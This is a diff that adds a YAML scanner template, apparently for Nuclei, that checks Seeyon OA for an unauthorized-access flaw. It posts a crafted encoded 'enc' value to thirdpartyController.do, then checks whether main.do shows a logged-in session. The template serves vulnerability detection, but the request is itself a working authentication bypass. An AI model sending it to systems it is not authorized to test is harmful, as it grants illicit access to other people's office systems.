@@ -1,0 +1,36 @@
+id: yaml-poc-seeyon-seeyon_oa-unauthorized_access-CT-158498
+info:
+  name: Yaml Poc Seeyon Seeyon_Oa Unauthorized_Access Ct 158498
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-seeyon-seeyon_oa-unauthorized_access-CT-158498'
+  tags: unauth
+  reference: []
+http:
+- method: POST
+  path:
+  - /seeyon/thirdpartyController.do
+  body: 'method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4
+
+    '
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: GET
+  path:
+  - /seeyon/main.do
+  headers:
+    Cookie: JSESSIONID={{session}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - 当前已登录了一个用户，同一窗口中不能登录多个用户
